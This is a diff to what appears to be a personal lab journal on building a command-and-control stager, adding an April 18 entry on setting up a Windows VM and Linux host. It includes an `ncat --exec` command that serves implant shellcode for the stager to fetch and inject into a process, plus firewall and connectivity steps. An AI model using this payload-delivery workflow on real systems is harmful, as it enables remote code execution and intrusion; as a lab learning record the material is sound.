@@ -201,3 +201,15 @@ Generating session implant shellcode. This is the one I retrieve using my stager
 
 I GOT THROUGH! I build the stager code into an executable, and double click it, run `sudo ncat -lvnp 8000 --send-only --exec "/bin/cat session_implant.bin"` on my linux machine to transfer the implant shellcode, and the stager will fetch the implant and execute it into a process (i used notepad).
 
+---
+
+### April 18
+
+Wrapping up. On Windows VM, I make sure that I have two active network adapters on the virtualbox, one for the internet, the other for connectivity between the VM and my linux machine (host-only, vboxnet0).
+
+On Linux, set firewall permissions to allow windows machine to communicate with it on a certain port. `sudo ufw allow from 192.168.56.102 to any port 8000 proto tcp`.
+
+On Windows, verify connection is able to go through. On powershell: `Test-NetConnection 192.168.56.1 -Port 8000`.
+
+Use `sudo ncat -lvnp 8000 --send-only --exec "/bin/cat session_implant.bin"` to prep the implant shellcode for transfer when the stager reaches out to the c2 server to fetch.
+
